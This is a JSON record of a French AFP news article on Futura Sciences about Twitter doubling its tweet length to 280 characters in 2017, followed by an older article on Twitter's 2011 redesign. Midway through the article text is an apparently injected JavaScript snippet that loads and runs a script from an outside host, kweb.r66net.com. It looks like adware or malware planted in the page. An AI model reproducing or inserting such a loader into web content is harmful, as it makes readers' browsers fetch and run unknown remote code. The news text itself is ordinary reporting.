{"title": "Twitter abandonne la limite de 140 caractères", "newspaper": "Futura Sciences", "author": "AFP", "date_publi": "08/11/2017", "content": "Le site de microblogging Twitter a décidé de doubler la taille maximale des messages. Ceux-ci pourront désormais comprendre jusqu'à 280 caractères, contre 140 auparavant. Cet assouplissement concerne les langues en caractères latins. Ce qu'il faut retenir Confronté à une stagnation de son audience, Twitter tente de simplifier son fonctionnement en doublant la taille maximale des messages (tweets). De 140 caractères, la limite passe à 280 pour les langues utilisant des caractères latins. Le japonais, le chinois et le coréen ne sont pas concernés. Mini-révolution chez  Twitter  : les utilisateurs vont pouvoir s'en donner à cœur joie et poster des messages en 280 caractères, le  réseau social  ayant enfin décidé d'autoriser des tweets deux fois plus longs, plus de dix ans après sa création. «  Nous allongeons la limite du nombre de caractères ! Nous voulons que ce soit plus facile et plus rapide pour tout le monde de s'exprimer  », commente le site de  microblogging . L'allongement ne concerne que les messages en caractères latins, rappelle le réseau, car c'est surtout en anglais, espagnol, portugais ou français que la limite de 140 caractères semble poser parfois souci aux utilisateurs, contrairement à ceux qui écrivent en japonais, coréen ou chinois, langues plus compactes. Selon les analyses menées par  Twitter  durant la période d'essai qui a précédé cette évolution, 9 % des tweets en anglais et 7 % en français atteignaient 140 caractères, des proportions qui tombent à environ 1 % avec le passage à 280.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La limite de 140 caractères faisait perdre du temps à l'utilisateur Twitter  estime que la limite de 140 caractères fait perdre du temps à l'utilisateur, qui doit modifier ou couper son message, au risque de se décourager et de ne pas tweeter du tout. Comme lors de l'annonce du test en septembre, la décision de  Twitter  a suscité une avalanche de réactions sur le réseau, beaucoup d'utilisateurs s'amusant à tester la nouvelle longueur. Plus sérieusement, Jennifer Grygiel, enseignante en communication à l'université de Syracuse, interrogée par l'AFP, estime que l'allongement des tweets «  va fondamentalement modifier les communications, une fois de plus  ». «  Cela va ralentir la vitesse à laquelle les utilisateurs consomment l'information et va permettre plus de clarté. Pas une mauvaise chose au moment où des leaders mondiaux profèrent des menaces militaires via le réseau  », poursuit l'universitaire, dans une allusion à l'utilisation de  Twitter  par le président américain Donald Trump. Twitter doit se renouveler Très actif sur le réseau social, où il poste des messages plusieurs fois par jour, ce dernier utilise la plateforme pour des annonces majeures de politique intérieure et internationale, mais aussi pour critiquer des alliés, railler des adversaires et menacer la Corée du Nord. La semaine dernière, Twitter avait annoncé  « des mesures » , sans préciser en quoi celles-ci consistaient, après que l'un de ses employés eut suspendu, l'espace de quelques minutes, le compte de Donald Trump. Contraint de se renouveler en raison de ses difficultés financières (il a encore perdu une vingtaine de millions de dollars au troisième trimestre et le nombre d'utilisateurs actifs stagne autour de 330 millions),  Twitter  marchait sur des œufs concernant l'allongement des tweets. Début 2016, l'hypothèse de l'abandon du dogme des 140 caractères avait provoqué une levée de boucliers de certains utilisateurs, craignant que le service perde son âme. Pour en savoir plus Un nouveau Twitter, plus simple et plus accessible Article initial de Marc Zaffagni, paru le 12/12/2011 Twitter, le site de microblogging, a complètement repensé son interface en insistant sur la simplicité et une ergonomie, avec l'objectif de séduire un public plus novice. Très utilisé par les journalistes et bien connu des  geeks ,  Twitter  apparaît un peu hermétique pour le public moins averti. C'est pour changer cette image un peu trop pointue que ce  réseau social  s'est offert un relooking complet, le premier de cette envergure en 5 ans d'existence. La nouvelle version de  Twitter.com  s'articule autour d'une signalétique plus claire avec des  icônes  qui pointent vers les fonctions principales du service. Cela commence par l'accueil, symbolisé par une petite maison qui regroupe le fil de tweets qui proviennent des pages Twitter qui l'on suit. Outre la mise en page qui fait passer le fil sur la côté droit de la page, la grande nouveauté est que les vidéos, les photos, les conversations sont directement intégrées de manière à offrir une continuité. L'onglet « @ Connecter » est le lieu où se tiennent les conversations avec les contacts dont on peut également suivre l'activité en voyant ceux qui ont mentionné, retweeté (comme on dit sur la Toile), ou mis en favori. Twitter a réussi son coup avec cette interface plus claire et mieux organisée. © Twitter                       Il y a ensuite l'onglet « Découvrir » représenté par le fameux hashtag qui permet de faire des recherches en utilisant des mots clés précédés du symbole #. L'espace Profil a également été remanié avec une mise en page plus lisible et des informations mieux regroupées. Le déploiement total de cette nouvelle mouture de Twitter sera effectif dans les jours à venir. Les utilisateurs possédant un  iPhone  ou un smartphone  Android  peuvent déjà la découvrir en installant la nouvelle version de leur  application . ", "theme": "tech"}